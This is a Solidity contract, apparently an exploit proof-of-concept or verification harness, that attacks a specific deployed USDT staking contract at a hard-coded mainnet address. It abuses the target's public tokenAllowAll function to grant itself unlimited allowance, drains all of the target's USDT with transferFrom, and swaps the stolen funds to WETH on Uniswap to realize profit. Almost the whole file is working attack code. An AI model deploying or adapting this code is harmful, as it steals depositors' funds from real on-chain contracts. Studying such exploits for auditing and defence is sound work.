// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IUSDTStakingContract28 {
    function tokenAllowAll(address asset, address allowee) external;
}

interface IUniswapV2RouterLike {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract FlawVerifier {
    address public constant TARGET = 0x800cfD4A2ba8CE93eA2cc814Fce26c3635169017;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 private _profitAmount;

    constructor() {}

    function executeOnOpportunity() external {
        IERC20Like usdt = IERC20Like(USDT);
        IERC20Like weth = IERC20Like(WETH);

        uint256 wethBefore = weth.balanceOf(address(this));
        uint256 targetBalanceBefore = usdt.balanceOf(TARGET);
        require(targetBalanceBefore > 0, "no USDT in target");

        // exploit_paths[0]: attacker calls `tokenAllowAll(USDT, attacker)`.
        // The verifier itself is the attacker here.
        IUSDTStakingContract28(TARGET).tokenAllowAll(USDT, address(this));

        // exploit_paths[1]: the target grants the verifier unlimited USDT allowance.
        uint256 grantedAllowance = usdt.allowance(TARGET, address(this));
        require(grantedAllowance >= targetBalanceBefore, "allowance not granted");

        // exploit_paths[2]: drain the target's USDT with transferFrom using the illicit allowance.
        _safeTransferFrom(USDT, TARGET, address(this), targetBalanceBefore);

        uint256 drainedUsdt = usdt.balanceOf(address(this));
        require(drainedUsdt >= targetBalanceBefore, "drain failed");

        // Realistic public monetization step:
        // after stealing the pool's USDT, swap it on Uniswap V2 into existing on-chain WETH so the
        // realized profit is expressed in an 18-decimal asset. This does not change the exploit root
        // cause or ordering: the theft still comes solely from the public tokenAllowAll approval.
        _forceApprove(USDT, UNISWAP_V2_ROUTER, drainedUsdt);

        address[] memory path = new address[](2);
        path[0] = USDT;
        path[1] = WETH;
        IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            drainedUsdt,
            1,
            path,
            address(this),
            block.timestamp
        );

        uint256 wethAfter = weth.balanceOf(address(this));
        require(wethAfter > wethBefore, "no profit realized");
        _profitAmount = wethAfter - wethBefore;
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _safeTransferFrom(address token, address from, address to, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(bytes4(keccak256("transferFrom(address,address,uint256)")), from, to, amount));
        require(ok, "transferFrom call failed");
        if (data.length > 0) {
            require(abi.decode(data, (bool)), "transferFrom returned false");
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(bytes4(keccak256("approve(address,uint256)")), spender, amount));
        if (ok && (data.length == 0 || abi.decode(data, (bool)))) {
            return;
        }

        (ok, data) = token.call(abi.encodeWithSelector(bytes4(keccak256("approve(address,uint256)")), spender, 0));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve reset failed");

        (ok, data) = token.call(abi.encodeWithSelector(bytes4(keccak256("approve(address,uint256)")), spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }
}
